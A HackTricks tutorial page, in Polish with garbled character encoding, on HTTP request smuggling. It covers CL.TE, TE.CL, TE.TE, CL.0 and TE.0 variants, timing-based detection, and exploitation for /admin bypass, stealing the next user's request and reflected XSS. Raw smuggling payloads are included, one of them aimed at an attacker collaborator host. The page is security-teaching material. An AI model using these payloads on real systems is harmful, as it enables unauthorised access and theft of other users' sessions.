# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## Czym jest

Ta luka wystÄ™puje, gdy **desynchronizacja** miÄ™dzy **proxy front-end** a serwerem **back-end** pozwala **atakujÄ…cemu** na **wysÅ‚anie** Å¼Ä…dania HTTP, ktÃ³re bÄ™dzie **interpretowane** jako **jedno Å¼Ä…danie** przez **proxy front-end** (load balance/reverse-proxy) i **jako 2 Å¼Ä…dania** przez serwer **back-end**.\
To pozwala uÅ¼ytkownikowi na **zmodyfikowanie nastÄ™pnego Å¼Ä…dania, ktÃ³re dotrze do serwera back-end po jego**.

### Teoria

[**Specyfikacja RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> JeÅ›li wiadomoÅ›Ä‡ jest odbierana z zarÃ³wno polem nagÅ‚Ã³wka Transfer-Encoding, jak i polem nagÅ‚Ã³wka Content-Length, to to drugie MUSI byÄ‡ zignorowane.

**Content-Length**

> NagÅ‚Ã³wek Content-Length wskazuje rozmiar ciaÅ‚a encji, w bajtach, wysÅ‚anego do odbiorcy.

**Transfer-Encoding: chunked**

> NagÅ‚Ã³wek Transfer-Encoding okreÅ›la formÄ™ kodowania uÅ¼ywanÄ… do bezpiecznego przesyÅ‚ania ciaÅ‚a Å‚adunku do uÅ¼ytkownika.\
> Chunked oznacza, Å¼e duÅ¼e dane sÄ… wysyÅ‚ane w serii kawaÅ‚kÃ³w.

### RzeczywistoÅ›Ä‡

**Front-End** (load-balance / Reverse Proxy) **przetwarza** nagÅ‚Ã³wek _**content-length**_ lub _**transfer-encoding**_ a serwer **Back-end** **przetwarza** drugi, co powoduje **desynchronizacjÄ™** miÄ™dzy 2 systemami.\
MoÅ¼e to byÄ‡ bardzo krytyczne, poniewaÅ¼ **atakujÄ…cy bÄ™dzie mÃ³gÅ‚ wysÅ‚aÄ‡ jedno Å¼Ä…danie** do reverse proxy, ktÃ³re bÄ™dzie **interpretowane** przez serwer **back-end** **jako 2 rÃ³Å¼ne Å¼Ä…dania**. **NiebezpieczeÅ„stwo** tej techniki polega na tym, Å¼e serwer **back-end** **zinterpretuje** **2-gie wstrzykniÄ™te Å¼Ä…danie** tak, jakby **pochodziÅ‚o od nastÄ™pnego klienta**, a **prawdziwe Å¼Ä…danie** tego klienta bÄ™dzie **czÄ™Å›ciÄ…** **wstrzykniÄ™tego Å¼Ä…dania**.

### SzczegÃ³lnoÅ›ci

PamiÄ™taj, Å¼e w HTTP **znak nowej linii skÅ‚ada siÄ™ z 2 bajtÃ³w:**

* **Content-Length**: Ten nagÅ‚Ã³wek uÅ¼ywa **liczby dziesiÄ™tnej** do wskazania **liczby** **bajtÃ³w** ciaÅ‚a Å¼Ä…dania. Oczekuje siÄ™, Å¼e ciaÅ‚o zakoÅ„czy siÄ™ na ostatnim znaku, **znak nowej linii nie jest potrzebny na koÅ„cu Å¼Ä…dania**.
* **Transfer-Encoding:** Ten nagÅ‚Ã³wek uÅ¼ywa w **ciele** **liczby szesnastkowej** do wskazania **liczby** **bajtÃ³w** **nastÄ™pnego kawaÅ‚ka**. **KawaÅ‚ek** musi **koÅ„czyÄ‡ siÄ™** znakiem **nowej linii**, ale ten nowy znak **nie jest liczony** przez wskaÅºnik dÅ‚ugoÅ›ci. Ta metoda transferu musi koÅ„czyÄ‡ siÄ™ **kawaÅ‚kiem o rozmiarze 0, po ktÃ³rym nastÄ™pujÄ… 2 nowe linie**: `0`
* **Connection**: Na podstawie mojego doÅ›wiadczenia zaleca siÄ™ uÅ¼ycie **`Connection: keep-alive`** w pierwszym Å¼Ä…daniu w request Smuggling.

## Podstawowe przykÅ‚ady

{% hint style="success" %}
PrÃ³bujÄ…c wykorzystaÄ‡ to z Burp Suite **wyÅ‚Ä…cz `Update Content-Length` i `Normalize HTTP/1 line endings`** w repeaterze, poniewaÅ¼ niektÃ³re gadÅ¼ety naduÅ¼ywajÄ… nowych linii, powrotÃ³w karetki i Åºle sformuÅ‚owanych dÅ‚ugoÅ›ci treÅ›ci.
{% endhint %}

Ataki HTTP request smuggling sÄ… tworzone poprzez wysyÅ‚anie niejednoznacznych Å¼Ä…daÅ„, ktÃ³re wykorzystujÄ… rÃ³Å¼nice w tym, jak serwery front-end i back-end interpretujÄ… nagÅ‚Ã³wki `Content-Length` (CL) i `Transfer-Encoding` (TE). Ataki te mogÄ… manifestowaÄ‡ siÄ™ w rÃ³Å¼nych formach, gÅ‚Ã³wnie jako **CL.TE**, **TE.CL** i **TE.TE**. KaÅ¼dy typ reprezentuje unikalnÄ… kombinacjÄ™ tego, jak serwery front-end i back-end priorytetujÄ… te nagÅ‚Ã³wki. Luka powstaje, gdy serwery przetwarzajÄ… to samo Å¼Ä…danie w rÃ³Å¼ny sposÃ³b, prowadzÄ…c do nieoczekiwanych i potencjalnie zÅ‚oÅ›liwych skutkÃ³w.

### Podstawowe przykÅ‚ady typÃ³w luk

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
Do poprzedniej tabeli powinieneÅ› dodaÄ‡ technikÄ™ TE.0, jak technikÄ™ CL.0, ale uÅ¼ywajÄ…c Transfer Encoding.
{% endhint %}

#### Luka CL.TE (Content-Length uÅ¼ywany przez Front-End, Transfer-Encoding uÅ¼ywany przez Back-End)

* **Front-End (CL):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Content-Length`.
* **Back-End (TE):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Transfer-Encoding`.
* **Scenariusz ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie, w ktÃ³rym wartoÅ›Ä‡ nagÅ‚Ã³wka `Content-Length` nie odpowiada rzeczywistej dÅ‚ugoÅ›ci treÅ›ci.
* Serwer front-end przesyÅ‚a caÅ‚e Å¼Ä…danie do back-endu, opierajÄ…c siÄ™ na wartoÅ›ci `Content-Length`.
* Serwer back-end przetwarza Å¼Ä…danie jako kawaÅ‚kowe z powodu nagÅ‚Ã³wka `Transfer-Encoding: chunked`, interpretujÄ…c pozostaÅ‚e dane jako osobne, nastÄ™pne Å¼Ä…danie.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Luka TE.CL (Transfer-Encoding uÅ¼ywany przez Front-End, Content-Length uÅ¼ywany przez Back-End)

* **Front-End (TE):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Transfer-Encoding`.
* **Back-End (CL):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Content-Length`.
* **Scenariusz ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie kawaÅ‚kowe, w ktÃ³rym rozmiar kawaÅ‚ka (`7b`) i rzeczywista dÅ‚ugoÅ›Ä‡ treÅ›ci (`Content-Length: 4`) nie sÄ… zgodne.
* Serwer front-end, honorujÄ…c `Transfer-Encoding`, przesyÅ‚a caÅ‚e Å¼Ä…danie do back-endu.
* Serwer back-end, respektujÄ…c `Content-Length`, przetwarza tylko poczÄ…tkowÄ… czÄ™Å›Ä‡ Å¼Ä…dania (`7b` bajtÃ³w), pozostawiajÄ…c resztÄ™ jako czÄ™Å›Ä‡ niezamierzonego nastÄ™pnego Å¼Ä…dania.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Luka TE.TE (Transfer-Encoding uÅ¼ywany przez oba, z obfuscacjÄ…)

* **Serwery:** Oba wspierajÄ… `Transfer-Encoding`, ale jeden moÅ¼e byÄ‡ oszukany, aby go zignorowaÄ‡ poprzez obfuscacjÄ™.
* **Scenariusz ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie z obfuscowanymi nagÅ‚Ã³wkami `Transfer-Encoding`.
* W zaleÅ¼noÅ›ci od tego, ktÃ³ry serwer (front-end lub back-end) nie rozpozna obfuscacji, moÅ¼e zostaÄ‡ wykorzystana luka CL.TE lub TE.CL.
* Niezrealizowana czÄ™Å›Ä‡ Å¼Ä…dania, widziana przez jeden z serwerÃ³w, staje siÄ™ czÄ™Å›ciÄ… nastÄ™pnego Å¼Ä…dania, prowadzÄ…c do smugglingu.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Scenariusz CL.CL (Content-Length uÅ¼ywany przez oba, Front-End i Back-End)**

* Oba serwery przetwarzajÄ… Å¼Ä…danie wyÅ‚Ä…cznie na podstawie nagÅ‚Ã³wka `Content-Length`.
* Ten scenariusz zazwyczaj nie prowadzi do smugglingu, poniewaÅ¼ istnieje zgodnoÅ›Ä‡ w tym, jak oba serwery interpretujÄ… dÅ‚ugoÅ›Ä‡ Å¼Ä…dania.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **Scenariusz CL.0**

* Odnosi siÄ™ do scenariuszy, w ktÃ³rych nagÅ‚Ã³wek `Content-Length` jest obecny i ma wartoÅ›Ä‡ innÄ… niÅ¼ zero, co wskazuje, Å¼e ciaÅ‚o Å¼Ä…dania ma zawartoÅ›Ä‡. Serwer back-end ignoruje nagÅ‚Ã³wek `Content-Length` (ktÃ³ry jest traktowany jako 0), ale front-end go analizuje.
* Jest to kluczowe w zrozumieniu i tworzeniu atakÃ³w smugglingowych, poniewaÅ¼ wpÅ‚ywa na to, jak serwery okreÅ›lajÄ… koniec Å¼Ä…dania.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### Scenariusz TE.0

* Podobnie jak poprzedni, ale uÅ¼ywajÄ…c TE.
* Technika [zgÅ‚oszona tutaj](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **PrzykÅ‚ad**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Åamanie serwera WWW

Ta technika jest rÃ³wnieÅ¼ przydatna w scenariuszach, w ktÃ³rych moÅ¼liwe jest **zÅ‚amanie serwera WWW podczas odczytywania poczÄ…tkowych danych HTTP**, ale **bez zamykania poÅ‚Ä…czenia**. W ten sposÃ³b **ciaÅ‚o** Å¼Ä…dania HTTP bÄ™dzie traktowane jako **nastÄ™pne Å¼Ä…danie HTTP**.

Na przykÅ‚ad, jak wyjaÅ›niono w [**tym opisie**](https://mizu.re/post/twisty-python), w Werkzeug moÅ¼liwe byÅ‚o wysÅ‚anie niektÃ³rych **znakÃ³w Unicode**, co spowodowaÅ‚o **zÅ‚amanie** serwera. Jednak jeÅ›li poÅ‚Ä…czenie HTTP zostaÅ‚o utworzone z nagÅ‚Ã³wkiem **`Connection: keep-alive`**, ciaÅ‚o Å¼Ä…dania nie zostanie odczytane, a poÅ‚Ä…czenie nadal bÄ™dzie otwarte, wiÄ™c **ciaÅ‚o** Å¼Ä…dania bÄ™dzie traktowane jako **nastÄ™pne Å¼Ä…danie HTTP**.

#### Wymuszanie przez nagÅ‚Ã³wki hop-by-hop

WykorzystujÄ…c nagÅ‚Ã³wki hop-by-hop, moÅ¼na wskazaÄ‡ proxy, aby **usunÄ™Å‚o nagÅ‚Ã³wek Content-Length lub Transfer-Encoding, aby moÅ¼liwe byÅ‚o naduÅ¼ycie HTTP request smuggling**.
```
Connection: Content-Length
```
For **wiÄ™cej informacji o nagÅ‚Ã³wkach hop-by-hop** odwiedÅº:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Znajdowanie HTTP Request Smuggling

Identyfikacja podatnoÅ›ci na HTTP request smuggling czÄ™sto moÅ¼e byÄ‡ osiÄ…gniÄ™ta za pomocÄ… technik czasowych, ktÃ³re polegajÄ… na obserwowaniu, jak dÅ‚ugo trwa odpowiedÅº serwera na manipulowane Å¼Ä…dania. Techniki te sÄ… szczegÃ³lnie przydatne do wykrywania podatnoÅ›ci CL.TE i TE.CL. OprÃ³cz tych metod istniejÄ… inne strategie i narzÄ™dzia, ktÃ³re moÅ¼na wykorzystaÄ‡ do znalezienia takich podatnoÅ›ci:

### Znajdowanie podatnoÅ›ci CL.TE za pomocÄ… technik czasowych

* **Metoda:**
* WyÅ›lij Å¼Ä…danie, ktÃ³re, jeÅ›li aplikacja jest podatna, spowoduje, Å¼e serwer zaplecza bÄ™dzie czekaÅ‚ na dodatkowe dane.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Obserwacja:**
* Serwer front-end przetwarza Å¼Ä…danie na podstawie `Content-Length` i przerywa wiadomoÅ›Ä‡ przedwczeÅ›nie.
* Serwer zaplecza, oczekujÄ…c na wiadomoÅ›Ä‡ w formacie chunked, czeka na nastÄ™pny kawaÅ‚ek, ktÃ³ry nigdy nie nadchodzi, co powoduje opÃ³Åºnienie.
* **WskaÅºniki:**
* Przekroczenia czasu lub dÅ‚ugie opÃ³Åºnienia w odpowiedzi.
* Otrzymanie bÅ‚Ä™du 400 Bad Request od serwera zaplecza, czasami z szczegÃ³Å‚owymi informacjami o serwerze.

### Znajdowanie podatnoÅ›ci TE.CL za pomocÄ… technik czasowych

* **Metoda:**
* WyÅ›lij Å¼Ä…danie, ktÃ³re, jeÅ›li aplikacja jest podatna, spowoduje, Å¼e serwer zaplecza bÄ™dzie czekaÅ‚ na dodatkowe dane.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Obserwacja:**
* Serwer front-end przetwarza Å¼Ä…danie na podstawie `Transfer-Encoding` i przesyÅ‚a caÅ‚Ä… wiadomoÅ›Ä‡.
* Serwer zaplecza, oczekujÄ…c na wiadomoÅ›Ä‡ na podstawie `Content-Length`, czeka na dodatkowe dane, ktÃ³re nigdy nie nadchodzÄ…, co powoduje opÃ³Åºnienie.

### Inne metody znajdowania podatnoÅ›ci

* **Analiza rÃ³Å¼nic w odpowiedziach:**
* WyÅ›lij nieco zmienione wersje Å¼Ä…dania i obserwuj, czy odpowiedzi serwera rÃ³Å¼niÄ… siÄ™ w nieoczekiwany sposÃ³b, co wskazuje na niezgodnoÅ›Ä‡ w analizie.
* **UÅ¼ywanie narzÄ™dzi automatycznych:**
* NarzÄ™dzia takie jak rozszerzenie 'HTTP Request Smuggler' w Burp Suite mogÄ… automatycznie testowaÄ‡ te podatnoÅ›ci, wysyÅ‚ajÄ…c rÃ³Å¼ne formy niejednoznacznych Å¼Ä…daÅ„ i analizujÄ…c odpowiedzi.
* **Testy zmiennoÅ›ci Content-Length:**
* WyÅ›lij Å¼Ä…dania z rÃ³Å¼nymi wartoÅ›ciami `Content-Length`, ktÃ³re nie sÄ… zgodne z rzeczywistÄ… dÅ‚ugoÅ›ciÄ… treÅ›ci i obserwuj, jak serwer radzi sobie z takimi niezgodnoÅ›ciami.
* **Testy zmiennoÅ›ci Transfer-Encoding:**
* WyÅ›lij Å¼Ä…dania z zafaÅ‚szowanymi lub Åºle sformuÅ‚owanymi nagÅ‚Ã³wkami `Transfer-Encoding` i monitoruj, jak rÃ³Å¼nie serwery front-end i zaplecza reagujÄ… na takie manipulacje.

### Testowanie podatnoÅ›ci na HTTP Request Smuggling

Po potwierdzeniu skutecznoÅ›ci technik czasowych, kluczowe jest zweryfikowanie, czy Å¼Ä…dania klienta mogÄ… byÄ‡ manipulowane. Prosta metoda to prÃ³ba zainfekowania swoich Å¼Ä…daÅ„, na przykÅ‚ad, aby Å¼Ä…danie do `/` zwrÃ³ciÅ‚o odpowiedÅº 404. PrzykÅ‚ady `CL.TE` i `TE.CL` omÃ³wione wczeÅ›niej w [Podstawowych przykÅ‚adach](./#basic-examples) pokazujÄ…, jak zainfekowaÄ‡ Å¼Ä…danie klienta, aby wywoÅ‚aÄ‡ odpowiedÅº 404, mimo Å¼e klient dÄ…Å¼yÅ‚ do uzyskania dostÄ™pu do innego zasobu.

**Kluczowe uwagi**

Podczas testowania podatnoÅ›ci na request smuggling poprzez zakÅ‚Ã³canie innych Å¼Ä…daÅ„, pamiÄ™taj o:

* **Oddzielnych poÅ‚Ä…czeniach sieciowych:** "atak" i "normalne" Å¼Ä…dania powinny byÄ‡ wysyÅ‚ane przez oddzielne poÅ‚Ä…czenia sieciowe. Wykorzystanie tego samego poÅ‚Ä…czenia dla obu nie potwierdza obecnoÅ›ci podatnoÅ›ci.
* **SpÃ³jnych URL i parametrÃ³w:** Staraj siÄ™ uÅ¼ywaÄ‡ identycznych URL i nazw parametrÃ³w dla obu Å¼Ä…daÅ„. Nowoczesne aplikacje czÄ™sto kierujÄ… Å¼Ä…dania do konkretnych serwerÃ³w zaplecza na podstawie URL i parametrÃ³w. Dopasowanie ich zwiÄ™ksza prawdopodobieÅ„stwo, Å¼e oba Å¼Ä…dania bÄ™dÄ… przetwarzane przez ten sam serwer, co jest warunkiem udanego ataku.
* **WarunkÃ³w czasowych i wyÅ›cigowych:** "normalne" Å¼Ä…danie, majÄ…ce na celu wykrycie zakÅ‚Ã³ceÅ„ ze strony "atakujÄ…cego" Å¼Ä…dania, konkuruje z innymi rÃ³wnolegÅ‚ymi Å¼Ä…daniami aplikacji. Dlatego wyÅ›lij "normalne" Å¼Ä…danie natychmiast po "atakujÄ…cym" Å¼Ä…daniu. ZajÄ™te aplikacje mogÄ… wymagaÄ‡ wielu prÃ³b dla ostatecznego potwierdzenia podatnoÅ›ci.
* **Wyzwania zwiÄ…zane z rÃ³wnowaÅ¼eniem obciÄ…Å¼enia:** Serwery front-end dziaÅ‚ajÄ…ce jako rÃ³wnowaÅ¼niki obciÄ…Å¼enia mogÄ… rozdzielaÄ‡ Å¼Ä…dania miÄ™dzy rÃ³Å¼ne systemy zaplecza. JeÅ›li "atak" i "normalne" Å¼Ä…dania trafiÄ… na rÃ³Å¼ne systemy, atak nie powiedzie siÄ™. Ten aspekt rÃ³wnowaÅ¼enia obciÄ…Å¼enia moÅ¼e wymagaÄ‡ kilku prÃ³b, aby potwierdziÄ‡ podatnoÅ›Ä‡.
* **Niezamierzony wpÅ‚yw na uÅ¼ytkownikÃ³w:** JeÅ›li twÃ³j atak niezamierzenie wpÅ‚ywa na Å¼Ä…danie innego uÅ¼ytkownika (nie "normalne" Å¼Ä…danie, ktÃ³re wysÅ‚aÅ‚eÅ› w celu wykrycia), wskazuje to, Å¼e twÃ³j atak wpÅ‚ynÄ…Å‚ na innego uÅ¼ytkownika aplikacji. CiÄ…gÅ‚e testowanie moÅ¼e zakÅ‚Ã³caÄ‡ innych uÅ¼ytkownikÃ³w, co wymaga ostroÅ¼nego podejÅ›cia.

## Wykorzystywanie HTTP Request Smuggling

### OminiÄ™cie zabezpieczeÅ„ front-end za pomocÄ… HTTP Request Smuggling

Czasami proxy front-end wprowadza Å›rodki bezpieczeÅ„stwa, analizujÄ…c przychodzÄ…ce Å¼Ä…dania. Jednak te Å›rodki mogÄ… byÄ‡ obejÅ›cie poprzez wykorzystanie HTTP Request Smuggling, co pozwala na nieautoryzowany dostÄ™p do zastrzeÅ¼onych punktÃ³w koÅ„cowych. Na przykÅ‚ad, dostÄ™p do `/admin` moÅ¼e byÄ‡ zabroniony z zewnÄ…trz, a proxy front-end aktywnie blokuje takie prÃ³by. Niemniej jednak, to proxy moÅ¼e zaniedbaÄ‡ sprawdzenie osadzonych Å¼Ä…daÅ„ w ramach przemyconego Å¼Ä…dania HTTP, pozostawiajÄ…c lukÄ™ do ominiÄ™cia tych ograniczeÅ„.

RozwaÅ¼ nastÄ™pujÄ…ce przykÅ‚ady ilustrujÄ…ce, jak HTTP Request Smuggling moÅ¼e byÄ‡ uÅ¼ywane do ominiÄ™cia zabezpieczeÅ„ front-end, szczegÃ³lnie celujÄ…c w Å›cieÅ¼kÄ™ `/admin`, ktÃ³ra jest zazwyczaj chroniona przez proxy front-end:

**PrzykÅ‚ad CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
W ataku CL.TE nagÅ‚Ã³wek `Content-Length` jest wykorzystywany w poczÄ…tkowym Å¼Ä…daniu, podczas gdy osadzone Å¼Ä…danie wykorzystuje nagÅ‚Ã³wek `Transfer-Encoding: chunked`. Proxy front-end przetwarza poczÄ…tkowe Å¼Ä…danie `POST`, ale nie sprawdza osadzonego Å¼Ä…dania `GET /admin`, co pozwala na nieautoryzowany dostÄ™p do Å›cieÅ¼ki `/admin`.

**TE.CL PrzykÅ‚ad**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
W przeciwnym razie, w ataku TE.CL, poczÄ…tkowe Å¼Ä…danie `POST` uÅ¼ywa `Transfer-Encoding: chunked`, a nastÄ™pne osadzone Å¼Ä…danie jest przetwarzane na podstawie nagÅ‚Ã³wka `Content-Length`. Podobnie jak w ataku CL.TE, proxy front-endowe pomija oszukaÅ„cze Å¼Ä…danie `GET /admin`, nieumyÅ›lnie przyznajÄ…c dostÄ™p do zastrzeÅ¼onej Å›cieÅ¼ki `/admin`.

### Odkrywanie przepisywania Å¼Ä…daÅ„ front-endowych <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacje czÄ™sto wykorzystujÄ… **serwer front-endowy** do modyfikacji przychodzÄ…cych Å¼Ä…daÅ„ przed ich przekazaniem do serwera back-endowego. Typowa modyfikacja polega na dodawaniu nagÅ‚Ã³wkÃ³w, takich jak `X-Forwarded-For: <IP klienta>`, aby przekazaÄ‡ IP klienta do back-endu. Zrozumienie tych modyfikacji moÅ¼e byÄ‡ kluczowe, poniewaÅ¼ moÅ¼e ujawniÄ‡ sposoby na **obejÅ›cie zabezpieczeÅ„** lub **ujawnienie ukrytych informacji lub punktÃ³w koÅ„cowych**.

Aby zbadaÄ‡, jak proxy zmienia Å¼Ä…danie, zlokalizuj parametr POST, ktÃ³ry back-end odzwierciedla w odpowiedzi. NastÄ™pnie stwÃ³rz Å¼Ä…danie, uÅ¼ywajÄ…c tego parametru na koÅ„cu, podobnie jak w poniÅ¼szym przykÅ‚adzie:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
W tej strukturze, kolejne komponenty Å¼Ä…dania sÄ… doÅ‚Ä…czane po `search=`, ktÃ³ry jest parametrem odzwierciedlonym w odpowiedzi. To odzwierciedlenie ujawni nagÅ‚Ã³wki kolejnego Å¼Ä…dania.

WaÅ¼ne jest, aby dostosowaÄ‡ nagÅ‚Ã³wek `Content-Length` zagnieÅ¼dÅ¼onego Å¼Ä…dania do rzeczywistej dÅ‚ugoÅ›ci treÅ›ci. Zaleca siÄ™ rozpoczÄ™cie od maÅ‚ej wartoÅ›ci i stopniowe zwiÄ™kszanie, poniewaÅ¼ zbyt niska wartoÅ›Ä‡ obetnie odzwierciedlone dane, podczas gdy zbyt wysoka wartoÅ›Ä‡ moÅ¼e spowodowaÄ‡ bÅ‚Ä…d Å¼Ä…dania.

Ta technika ma rÃ³wnieÅ¼ zastosowanie w kontekÅ›cie podatnoÅ›ci TE.CL, ale Å¼Ä…danie powinno koÅ„czyÄ‡ siÄ™ na `search=\r\n0`. NiezaleÅ¼nie od znakÃ³w nowej linii, wartoÅ›ci bÄ™dÄ… doÅ‚Ä…czane do parametru wyszukiwania.

Metoda ta sÅ‚uÅ¼y gÅ‚Ã³wnie do zrozumienia modyfikacji Å¼Ä…dania dokonywanych przez proxy front-end, zasadniczo przeprowadzajÄ…c samodzielne dochodzenie.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

MoÅ¼liwe jest przechwycenie Å¼Ä…daÅ„ nastÄ™pnego uÅ¼ytkownika, doÅ‚Ä…czajÄ…c konkretne Å¼Ä…danie jako wartoÅ›Ä‡ parametru podczas operacji POST. Oto jak moÅ¼na to osiÄ…gnÄ…Ä‡:

DoÅ‚Ä…czajÄ…c nastÄ™pujÄ…ce Å¼Ä…danie jako wartoÅ›Ä‡ parametru, moÅ¼esz przechowaÄ‡ Å¼Ä…danie kolejnego klienta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
W tym scenariuszu, **parametr komentarza** ma na celu przechowywanie treÅ›ci w sekcji komentarzy posta na publicznie dostÄ™pnym stronie. W zwiÄ…zku z tym, zawartoÅ›Ä‡ kolejnego Å¼Ä…dania pojawi siÄ™ jako komentarz.

Jednak ta technika ma ograniczenia. Zazwyczaj przechwytuje dane tylko do ogranicznika parametru uÅ¼ywanego w przemycanym Å¼Ä…daniu. Dla przesyÅ‚ania formularzy zakodowanych w URL, tym ogranicznikiem jest znak `&`. Oznacza to, Å¼e przechwycona zawartoÅ›Ä‡ z Å¼Ä…dania uÅ¼ytkownika ofiary zatrzyma siÄ™ na pierwszym `&`, ktÃ³ry moÅ¼e byÄ‡ nawet czÄ™Å›ciÄ… ciÄ…gu zapytania.

Dodatkowo, warto zauwaÅ¼yÄ‡, Å¼e podejÅ›cie to jest rÃ³wnieÅ¼ wykonalne w przypadku podatnoÅ›ci TE.CL. W takich przypadkach, Å¼Ä…danie powinno koÅ„czyÄ‡ siÄ™ na `search=\r\n0`. NiezaleÅ¼nie od znakÃ³w nowej linii, wartoÅ›ci bÄ™dÄ… dodawane do parametru wyszukiwania.

### Wykorzystanie przemycania Å¼Ä…daÅ„ HTTP do eksploatacji odzwierciedlonego XSS

Przemycanie Å¼Ä…daÅ„ HTTP moÅ¼e byÄ‡ wykorzystane do eksploatacji stron internetowych podatnych na **odzwierciedlone XSS**, oferujÄ…c znaczÄ…ce korzyÅ›ci:

* Interakcja z docelowymi uÅ¼ytkownikami **nie jest wymagana**.
* UmoÅ¼liwia eksploatacjÄ™ XSS w czÄ™Å›ciach Å¼Ä…dania, ktÃ³re sÄ… **normalnie niedostÄ™pne**, jak nagÅ‚Ã³wki Å¼Ä…daÅ„ HTTP.

